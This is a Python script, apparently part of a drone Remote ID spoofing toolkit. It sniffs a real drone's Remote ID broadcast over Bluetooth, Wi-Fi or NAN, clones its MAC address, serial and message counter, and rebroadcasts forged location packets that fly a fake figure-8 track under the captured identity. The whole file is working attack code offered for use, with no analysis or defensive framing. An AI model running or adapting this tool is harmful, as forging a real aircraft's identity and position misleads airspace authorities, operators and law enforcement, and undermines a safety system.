#!/usr/bin/env python3
import argparse
import logging
import math
import struct
import time
from datetime import datetime, timedelta

from drone_rid_spoofer.state import DroneState
from drone_rid_spoofer.transport.ble import BleExtendedBackend, BleLegacyBackend
from drone_rid_spoofer.transport.wifi import WifiBackend
from drone_rid_spoofer.transport.nan import NanBackend
from drone_rid_spoofer.messages import _encode_speed, _transform_rotation
from drone_rid_spoofer.takeover import TakeoverSpoofer, make_valid_ble_mac, make_valid_wifi_mac

logging.basicConfig(level=logging.INFO, format='%(levelname)s: %(message)s')

class Figure8Takeover(TakeoverSpoofer):
    def _generate_figure_8_waypoints(self, start_lat: float, start_lng: float) -> list:
        # A simple figure 8 using Lemniscate of Bernoulli
        # Scale: ~50 meters amplitude
        lat_scale = 1 / 111320.0
        lng_scale = 1 / (111320.0 * math.cos(math.radians(start_lat)))
        
        A = 50.0 
        waypoints = []
        
        # 5 loops, 50 points per loop
        for t_step in range(0, 50 * 5):
            t = (t_step / 50.0) * 2 * math.pi
            
            x = A * math.sin(t)
            y = A * math.sin(t) * math.cos(t)
            
            wp_lat = start_lat + (y * lat_scale)
            wp_lng = start_lng + (x * lng_scale)
            
            # Convert to int7 format. Hold time is 0 (continuous movement)
            waypoints.append((int(wp_lat * 1e7), int(wp_lng * 1e7), 0))
            
        return waypoints
        
    def run_spoofing(self, transport="ble5", wifi_iface="wlan1", counter_offset=1, nan_port=8080):
        logging.info("Calculating trajectory...")
        
        def calculate_kinematics(lat1_int, lon1_int, lat2_int, lon2_int, dt_seconds):
            lat1 = math.radians(lat1_int / 1e7)
            lon1 = math.radians(lon1_int / 1e7)
            lat2 = math.radians(lat2_int / 1e7)
            lon2 = math.radians(lon2_int / 1e7)
            
            dlon = lon2 - lon1
            
            a = math.sin((lat2 - lat1)/2)**2 + math.cos(lat1) * math.cos(lat2) * math.sin(dlon/2)**2
            c = 2 * math.atan2(math.sqrt(a), math.sqrt(1-a))
            distance = 6371000 * c
            speed = distance / dt_seconds if dt_seconds > 0 else 0
            
            x = math.sin(dlon) * math.cos(lat2)
            y = math.cos(lat1) * math.sin(lat2) - (math.sin(lat1) * math.cos(lat2) * math.cos(dlon))
            initial_bearing = math.atan2(x, y)
            bearing_degrees = (math.degrees(initial_bearing) + 360) % 360
            
            return speed, int(bearing_degrees)
        
        # Predict location exactly 1 second in the future from the last received packet
        # to ensure perfect continuity of the 1 Hz kinematics metronome.
        start_lat = self.last_location_data['lat']
        start_lng = self.last_location_data['lon']
        
        waypoints = self._generate_figure_8_waypoints(start_lat, start_lng)
        
        # If crossing domains, ensure the spoofed MAC complies with specs
        ble_mac = make_valid_ble_mac(self.target_mac)
        wifi_mac = make_valid_wifi_mac(self.target_mac)
        
        drone_state = DroneState(
            serial=self.basic_id,
            pilot_location=(int(start_lat*1e7), int(start_lng*1e7)),
            lat=waypoints[0][0],
            lng=waypoints[0][1],
            mac_address=wifi_mac,
            ble_address=ble_mac,
            mode="waypoints",
            waypoints=waypoints,
            geodetic_altitude=self.last_location_data['alt']
        )
        
        def hybrid_packet_builder(drone: DroneState) -> list:
            # Patch the precise lat/lng bytes of the originally captured location message
            # to preserve protocol version, timestamps, speed, and other native formatting.
            raw_loc = bytearray(self.raw_location_msg)
            
            # 1. Update Latitude and Longitude (scale floats to 1e7 integers)
            lat_int = int(drone.lat * 1e7) if isinstance(drone.lat, float) else drone.lat
            lng_int = int(drone.lng * 1e7) if isinstance(drone.lng, float) else drone.lng
            raw_loc[5:9] = struct.pack("<i", lat_int)
            raw_loc[9:13] = struct.pack("<i", lng_int)
            
            # 2. Update Speed
            raw_loc[3] = _encode_speed(drone.speed)
            
            # 3. Update Heading/Direction
            dir_val, ew_dir = _transform_rotation(drone.direction)
            # Preserve the other flags in byte 1 (Status, Height Type, etc.), but update EW Direction bit
            raw_loc[1] = (raw_loc[1] & 0xFD) | (ew_dir & 0x02)
            raw_loc[2] = int(dir_val)
            
            # Combine the patched live location with verbatim static messages
            combined_msgs = [bytes(raw_loc)] + self.captured_static_messages
            # Sort messages by Message Type (first 4 bits) to ensure proper receiver parsing
            combined_msgs.sort(key=lambda m: m[0] >> 4)
            return combined_msgs

        start_cnt = (self.last_message_count + counter_offset) & 0xFF
        logging.info(f"Starting {transport.upper()} spoofing hijacking MAC {self.target_mac} (Counter starts at {start_cnt})...")
        
        if transport == "ble5":
            backend = BleExtendedBackend(adapter=self.adapter, pure_bt5=True)
            backend._extended_counters = {drone_state.serial: start_cnt}
        elif transport == "ble4":
            backend = BleLegacyBackend(adapter=self.adapter)
            backend._legacy_counters = {drone_state.serial: start_cnt}
        elif transport == "wifi":
            backend = WifiBackend(interface=wifi_iface)
            backend._msg_counters = {drone_state.serial: start_cnt}
        elif transport == "nan":
            backend = NanBackend(port=nan_port)
            backend._counters = {drone_state.mac_address: start_cnt}
        else:
            raise ValueError(f"Unknown transport {transport}")
            
        backend.start([drone_state], hybrid_packet_builder)
        
        try:
            # Let the spoofer loop run
            dt = 1.0
            next_tick = time.time()
            while drone_state.active:
                now = time.time()
                if now >= next_tick:
                    dt_now = datetime.now()
                    
                    if drone_state.next_waypoint_time is None:
                        # Wait for exactly 1 interval before issuing the first figure-8 waypoint.
                        # Since hold_seconds is 0, we don't add it.
                        drone_state.next_waypoint_time = dt_now + timedelta(seconds=1.0)
                    elif dt_now >= drone_state.next_waypoint_time:
                        if drone_state.waypoint_index < len(drone_state.waypoints) - 1:
                            drone_state.waypoint_index += 1
                            lat, lng, hold = drone_state.waypoints[drone_state.waypoint_index]
                            
                            speed, heading = calculate_kinematics(drone_state.lat, drone_state.lng, lat, lng, 1.0)
                            drone_state.speed = speed
                            drone_state.direction = heading
                            drone_state.lat = lat
                            drone_state.lng = lng
                            drone_state.next_waypoint_time = dt_now + timedelta(seconds=hold)
                            
                            if drone_state.waypoint_index % 5 == 0:
                                logging.info(f"Spoofing Trajectory Update -> Lat: {lat}, Lng: {lng}, Speed: {speed:.1f}m/s")
                        else:
                            logging.info("Reached the end of the figure-8 trajectory. Stopping.")
                            drone_state.active = False
                            
                    next_tick += dt
                time.sleep(0.1)
        except KeyboardInterrupt:
            pass
        finally:
            backend.close()
            logging.info("Takeover complete.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Sniff and takeover a Remote ID Drone")
    parser.add_argument("-i", "--interface", default="hci0", help="BLE adapter (default: hci0)")
    parser.add_argument("-w", "--wifi-iface", default=None, help="Wi-Fi Monitor Interface (default: None)")
    parser.add_argument("-t", "--transport", choices=["ble5", "ble4", "wifi", "nan"], default="ble5", help="Transport medium to broadcast spoof on (default: ble5)")
    parser.add_argument("--nan-port", type=int, default=8080, help="TCP port for NAN Android bridge (default: 8080)")
    parser.add_argument("-o", "--offset", type=int, default=1, help="Offset added to the sniffed counter (default: 1). Can be negative (e.g., --offset=-5).")
    args = parser.parse_args()
    
    takeover = Figure8Takeover(adapter=args.interface)
    
    # Wait for either HCI or Wi-Fi to find a valid remote ID packet
    # Default to scanning ble5 if an HCI interface is provided.
    ble_scan_type = args.transport if args.transport in ["ble4", "ble5"] else "ble5"
    takeover.start_sniffing(ble_interface=args.interface, ble_scan_type=ble_scan_type, wifi_iface=args.wifi_iface, continuous=False)
    
    if takeover.target_mac:
        logging.info(f"Target locked! Captured message count was: {takeover.last_message_count}")
        takeover.run_spoofing(transport=args.transport, wifi_iface=args.wifi_iface, counter_offset=args.offset, nan_port=args.nan_port)
